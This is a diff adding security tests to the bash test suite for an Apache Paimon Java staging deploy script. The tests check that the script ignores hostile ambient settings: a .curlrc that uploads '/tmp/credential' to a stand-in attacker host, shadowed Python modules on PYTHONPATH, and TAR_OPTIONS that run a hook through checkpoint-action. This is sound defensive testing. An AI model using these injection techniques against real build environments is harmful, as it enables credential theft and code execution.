@@ -966,6 +966,10 @@ printf 'host=%s\n' "${GH_HOST:-}" >> "$FAKE_GH_LOG"
 if [[ "${1-}" == config &&
       "${2-}" == get &&
       "${3-}" == http_unix_socket ]]; then
+  if [[ "${FAKE_GH_CONFIG_STATUS:-0}" -ne 0 ]]; then
+    echo "fake GitHub config failure" >&2
+    exit "$FAKE_GH_CONFIG_STATUS"
+  fi
   printf '%s\n' "${FAKE_GH_HTTP_UNIX_SOCKET:-}"
   exit 0
 fi
@@ -1411,6 +1415,7 @@ set -o nounset
 set -o pipefail
 
 printf 'args=%s\n' "$*" >> "$FAKE_CURL_LOG"
+printf 'curl-home=%s\n' "${CURL_HOME:-}" >> "$FAKE_CURL_LOG"
 output=
 config=
 while [[ $# -gt 0 ]]; do
@@ -1519,7 +1524,7 @@ EOF
 
 run_script() {
   (
-    cd "$FIXTURE_DIR"
+    cd "${RUN_SCRIPT_CWD:-$FIXTURE_DIR}"
     HOME="$FIXTURE_DIR/home" \
       PATH="$FIXTURE_DIR/fake-bin:$(dirname "$BASH"):$PATH" \
       REAL_GIT="$REAL_GIT" \
@@ -1542,7 +1547,7 @@ run_script() {
       FAKE_PROVENANCE_PATH="$PROVENANCE_PATH" \
       FAKE_STAGING_PROFILE_ID="$STAGING_PROFILE_ID" \
       TMPDIR="$TEST_ROOT" \
-      "$BASH" ./tools/deploy_java_staging.sh \
+      "$BASH" "$FIXTURE_DIR/tools/deploy_java_staging.sh" \
         --release-version 0.3.0 \
         --rc 1 \
         --run-id 42 \
@@ -1954,6 +1959,19 @@ test_github_unix_socket_is_rejected_before_api_calls() {
   assert_maven_not_invoked
 }
 
+test_github_transport_inspection_failure_stops_before_api_calls() {
+  new_fixture
+  if FAKE_GH_CONFIG_STATUS=43 \
+    run_script --dry-run > "$OUTPUT_LOG" 2>&1; then
+    fail "GitHub transport inspection failure was ignored"
+  fi
+
+  assert_contains "$OUTPUT_LOG" \
+    "Unable to inspect the GitHub CLI HTTP transport configuration"
+  assert_not_contains "$GH_LOG" "args=api"
+  assert_maven_not_invoked
+}
+
 test_java_package_metadata_must_be_complete() {
   new_fixture
   if FAKE_DUPLICATE_ARTIFACT=true \
@@ -2324,6 +2342,201 @@ PY
       fail "JNI names without dynamic exports were accepted: $native"
     fi
     assert_contains "$OUTPUT_LOG" "missing JNI exports"
+    assert_maven_not_invoked
+  done
+}
+
+remove_single_candidate_jni_export() {
+  local native=$1
+  local position=$2
+
+  REMOVED_JNI_SYMBOL=$(
+    "$PYTHON" - \
+    "$CANDIDATE_DIR/mosaic-0.3.0.jar" \
+    "$native" \
+    "$FIXTURE_DIR/java/src/main/java/org/apache/paimon/mosaic/NativeLib.java" \
+    "$position" <<'PY'
+import os
+import re
+import struct
+import sys
+import zipfile
+from pathlib import Path
+
+
+jar_path = Path(sys.argv[1])
+entry_name = sys.argv[2]
+source_path = Path(sys.argv[3])
+position = sys.argv[4]
+methods = sorted(re.findall(
+    r"\bnative\s+[A-Za-z0-9_.$<>\[\]?]+\s+"
+    r"([A-Za-z_$][A-Za-z0-9_$]*)\s*\(",
+    source_path.read_text(encoding="utf-8"),
+))
+indexes = {"first": 0, "middle": len(methods) // 2, "last": len(methods) - 1}
+target = (
+    "Java_org_apache_paimon_mosaic_NativeLib_" + methods[indexes[position]]
+).encode("ascii")
+temporary = jar_path.with_suffix(".tmp")
+
+
+def c_string(data, offset, limit):
+    end = data.index(0, offset, limit)
+    return bytes(data[offset:end])
+
+
+def remove_elf_export(data):
+    section_offset = struct.unpack_from("<Q", data, 40)[0]
+    section_size = struct.unpack_from("<H", data, 58)[0]
+    section_count = struct.unpack_from("<H", data, 60)[0]
+    for index in range(section_count):
+        section = section_offset + index * section_size
+        if struct.unpack_from("<I", data, section + 4)[0] != 11:
+            continue
+        symbol_offset = struct.unpack_from("<Q", data, section + 24)[0]
+        symbol_size = struct.unpack_from("<Q", data, section + 32)[0]
+        string_section_index = struct.unpack_from("<I", data, section + 40)[0]
+        entry_size = struct.unpack_from("<Q", data, section + 56)[0]
+        string_section = section_offset + string_section_index * section_size
+        string_offset = struct.unpack_from("<Q", data, string_section + 24)[0]
+        string_size = struct.unpack_from("<Q", data, string_section + 32)[0]
+        for symbol in range(1, symbol_size // entry_size):
+            offset = symbol_offset + symbol * entry_size
+            name_index = struct.unpack_from("<I", data, offset)[0]
+            if c_string(
+                data, string_offset + name_index, string_offset + string_size
+            ) == target:
+                struct.pack_into("<H", data, offset + 6, 0)
+                return
+    raise AssertionError("target ELF export not found")
+
+
+def remove_macho_export(data):
+    command_count = struct.unpack_from("<I", data, 16)[0]
+    offset = 32
+    for _ in range(command_count):
+        command, size = struct.unpack_from("<II", data, offset)
+        if command == 0x2:
+            symbol_offset, symbol_count, string_offset, string_size = (
+                struct.unpack_from("<IIII", data, offset + 8)
+            )
+            expected = b"_" + target
+            for symbol in range(symbol_count):
+                symbol_entry = symbol_offset + symbol * 16
+                name_index = struct.unpack_from("<I", data, symbol_entry)[0]
+                if c_string(
+                    data,
+                    string_offset + name_index,
+                    string_offset + string_size,
+                ) == expected:
+                    data[symbol_entry + 4] = 0x01
+                    return
+        offset += size
+    raise AssertionError("target Mach-O export not found")
+
+
+def remove_pe_export(data):
+    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
+    section_count = struct.unpack_from("<H", data, pe_offset + 6)[0]
+    optional_size = struct.unpack_from("<H", data, pe_offset + 20)[0]
+    optional_offset = pe_offset + 24
+    section_offset = optional_offset + optional_size
+    export_rva = struct.unpack_from("<I", data, optional_offset + 112)[0]
+    export_size = struct.unpack_from("<I", data, optional_offset + 116)[0]
+
+    def rva_to_offset(rva):
+        for index in range(section_count):
+            section = section_offset + index * 40
+            virtual_size = struct.unpack_from("<I", data, section + 8)[0]
+            virtual_address = struct.unpack_from("<I", data, section + 12)[0]
+            raw_size = struct.unpack_from("<I", data, section + 16)[0]
+            raw_offset = struct.unpack_from("<I", data, section + 20)[0]
+            extent = max(virtual_size, raw_size)
+            if virtual_address <= rva < virtual_address + extent:
+                return raw_offset + rva - virtual_address
+        raise AssertionError("PE RVA is not file-backed")
+
+    export_offset = rva_to_offset(export_rva)
+    function_count = struct.unpack_from("<I", data, export_offset + 20)[0]
+    name_count = struct.unpack_from("<I", data, export_offset + 24)[0]
+    functions_offset = rva_to_offset(
+        struct.unpack_from("<I", data, export_offset + 28)[0]
+    )
+    names_offset = rva_to_offset(
+        struct.unpack_from("<I", data, export_offset + 32)[0]
+    )
+    ordinals_offset = rva_to_offset(
+        struct.unpack_from("<I", data, export_offset + 36)[0]
+    )
+    for index in range(name_count):
+        name_offset = rva_to_offset(
+            struct.unpack_from("<I", data, names_offset + index * 4)[0]
+        )
+        if c_string(data, name_offset, len(data)) != target:
+            continue
+        ordinal = struct.unpack_from(
+            "<H", data, ordinals_offset + index * 2
+        )[0]
+        if ordinal >= function_count:
+            raise AssertionError("PE export ordinal is invalid")
+        struct.pack_into(
+            "<I", data, functions_offset + ordinal * 4, export_rva
+        )
+        return
+    raise AssertionError("target PE export not found")
+
+
+with zipfile.ZipFile(jar_path) as source, zipfile.ZipFile(
+    temporary, "w", zipfile.ZIP_DEFLATED
+) as output:
+    for info in source.infolist():
+        contents = source.read(info)
+        if info.filename == entry_name:
+            data = bytearray(contents)
+            if data[:4] == b"\x7fELF":
+                remove_elf_export(data)
+            elif data[:4] == b"\xcf\xfa\xed\xfe":
+                remove_macho_export(data)
+            elif data[:2] == b"MZ":
+                remove_pe_export(data)
+            else:
+                raise AssertionError("unexpected native format")
+            contents = bytes(data)
+        output_info = zipfile.ZipInfo(
+            info.filename,
+            date_time=(2026, 1, 1, 0, 0, 0),
+        )
+        output_info.compress_type = zipfile.ZIP_DEFLATED
+        output.writestr(output_info, contents)
+os.replace(temporary, jar_path)
+print(target.decode("ascii"))
+PY
+  )
+  repack_candidate_and_refresh_provenance
+}
+
+test_validator_rejects_single_missing_jni_exports() {
+  local case_spec
+  local native
+  local position
+  local symbol
+
+  for case_spec in \
+    "native/linux/x86_64/libpaimon_mosaic_jni.so first" \
+    "native/linux/aarch64/libpaimon_mosaic_jni.so middle" \
+    "native/macos/aarch64/libpaimon_mosaic_jni.dylib last" \
+    "native/windows/x86_64/paimon_mosaic_jni.dll middle"
+  do
+    native=${case_spec% *}
+    position=${case_spec##* }
+    new_fixture
+    remove_single_candidate_jni_export "$native" "$position"
+    symbol=$REMOVED_JNI_SYMBOL
+
+    if run_script --dry-run > "$OUTPUT_LOG" 2>&1; then
+      fail "single missing JNI export was accepted: $native $symbol"
+    fi
+    assert_contains "$OUTPUT_LOG" "$symbol"
     assert_maven_not_invoked
   done
 }
@@ -2949,8 +3162,43 @@ test_real_deploy_downloads_pinned_asf_keys_by_default() {
   fi
 
   assert_contains "$CURL_LOG" \
-    "args=--proto =https --tlsv1.2 --location --fail --silent --show-error --retry 3 --retry-connrefused --connect-timeout 10 --max-time 300"
+    "args=-q --proto =https --tlsv1.2 --location --fail --silent --show-error --retry 3 --retry-connrefused --connect-timeout 10 --max-time 300"
   assert_contains "$CURL_LOG" "https://downloads.apache.org/paimon/KEYS"
+}
+
+test_curl_ambient_config_is_ignored() {
+  local curl_home
+  local invocation_count
+  local line
+
+  new_fixture
+  curl_home=$(mktemp -d "$TEST_ROOT/curl-home.XXXXXX")
+  cat > "$curl_home/.curlrc" <<'EOF'
+url = "https://attacker.invalid/"
+upload-file = "/tmp/credential"
+EOF
+
+  CURL_HOME="$curl_home" \
+    run_script \
+      --gpg-keyname 0123456789ABCDEF0123456789ABCDEF01234567 \
+      > "$OUTPUT_LOG" 2>&1
+
+  invocation_count=0
+  while IFS= read -r line; do
+    case "$line" in
+      args=*)
+        invocation_count=$((invocation_count + 1))
+        case "$line" in
+          "args=-q "*) ;;
+          *) fail "curl invocation did not disable ambient config first: $line" ;;
+        esac
+        ;;
+    esac
+  done < "$CURL_LOG"
+  if [[ "$invocation_count" -ne 2 ]]; then
+    fail "expected two controlled curl invocations; got $invocation_count"
+  fi
+  assert_not_contains "$CURL_LOG" "curl-home=$curl_home"
 }
 
 test_settings_and_environment_cannot_control_plugin_resolution_or_signing_inputs() {
@@ -3398,6 +3646,60 @@ test_maven_and_jvm_environment_is_scrubbed() {
   assert_not_contains "$MAVEN_LOG" "ssl.insecure=true"
 }
 
+test_python_import_environment_is_isolated() {
+  local attacker_dir
+  local marker
+  local module
+
+  new_fixture
+  attacker_dir=$(mktemp -d "$FIXTURE_DIR/python-imports.XXXXXX")
+  basename "$attacker_dir" >> "$FIXTURE_DIR/.git/info/exclude"
+  for module in json zipfile hashlib; do
+    marker="$attacker_dir/$module.marker"
+    cat > "$attacker_dir/$module.py" <<EOF
+open("$marker", "w").write("executed")
+raise RuntimeError("ambient $module module executed")
+EOF
+  done
+
+  if ! RUN_SCRIPT_CWD="$attacker_dir" \
+    PYTHONPATH="$attacker_dir" \
+    run_script \
+      --gpg-keyname 0123456789ABCDEF0123456789ABCDEF01234567 \
+      > "$OUTPUT_LOG" 2>&1; then
+    sed -n '1,240p' "$OUTPUT_LOG" >&2
+    fail "ambient Python import paths broke staging"
+  fi
+
+  for module in json zipfile hashlib; do
+    marker="$attacker_dir/$module.marker"
+    if [[ -e "$marker" ]]; then
+      fail "ambient Python module executed: $module"
+    fi
+  done
+}
+
+test_tar_options_are_ignored() {
+  local hook
+  local marker
+
+  new_fixture
+  hook="$TEST_ROOT/tar-hook.sh"
+  marker="$TEST_ROOT/tar-hook.marker"
+  cat > "$hook" <<EOF
+#!/usr/bin/env bash
+printf 'executed\n' > "$marker"
+EOF
+  chmod +x "$hook"
+
+  TAR_OPTIONS="--checkpoint=1 --checkpoint-action=exec=$hook" \
+    run_script --dry-run > "$OUTPUT_LOG" 2>&1
+
+  if [[ -e "$marker" ]]; then
+    fail "ambient TAR_OPTIONS executed a command"
+  fi
+}
+
 test_maven_failure_status_is_preserved() {
   new_fixture
   keys=$(mktemp "$TEST_ROOT/keys.XXXXXX")
@@ -3622,6 +3924,7 @@ run_test test_downloads_java_candidate_by_immutable_artifact_id
 run_test test_dry_run_can_validate_a_fork_without_enabling_real_deploy
 run_test test_github_host_is_pinned
 run_test test_github_unix_socket_is_rejected_before_api_calls
+run_test test_github_transport_inspection_failure_stops_before_api_calls
 run_test test_java_package_metadata_must_be_complete
 run_test test_downloaded_java_package_digest_must_match_metadata
 run_test test_java_package_zip_rejects_unsafe_paths
@@ -3630,6 +3933,7 @@ run_test test_validator_rejects_one_byte_classifier_jars
 run_test test_validator_rejects_invalid_java_class_and_maven_metadata
 run_test test_validator_rejects_invalid_legal_and_native_contents
 run_test test_validator_rejects_jni_names_without_dynamic_exports
+run_test test_validator_rejects_single_missing_jni_exports
 run_test test_validator_rejects_loader_unresolvable_elf_exports
 run_test test_validator_rejects_macho_names_missing_from_export_trie
 run_test test_validator_accepts_callable_elf_notype_exports
@@ -3645,6 +3949,7 @@ run_test test_dry_run_invokes_no_maven_or_gpg
 run_test test_real_deploy_requires_full_and_explicit_signing_fingerprint
 run_test test_real_deploy_requires_local_and_asf_signing_key
 run_test test_real_deploy_downloads_pinned_asf_keys_by_default
+run_test test_curl_ambient_config_is_ignored
 run_test test_settings_and_environment_cannot_control_plugin_resolution_or_signing_inputs
 run_test test_pinned_plugin_download_digest_mismatch_stops_before_maven
 run_test test_real_deploy_uses_only_two_direct_plugin_goals
@@ -3654,6 +3959,8 @@ run_test test_signing_cannot_mutate_pinned_plugin_closure_before_upload
 run_test test_missing_bad_or_wrong_key_signature_blocks_nexus
 run_test test_final_provenance_boundary_runs_after_signatures
 run_test test_maven_and_jvm_environment_is_scrubbed
+run_test test_python_import_environment_is_isolated
+run_test test_tar_options_are_ignored
 run_test test_maven_failure_status_is_preserved
 run_test test_nexus_maven_failure_status_is_preserved
 run_test test_real_deploy_requires_official_repository_run
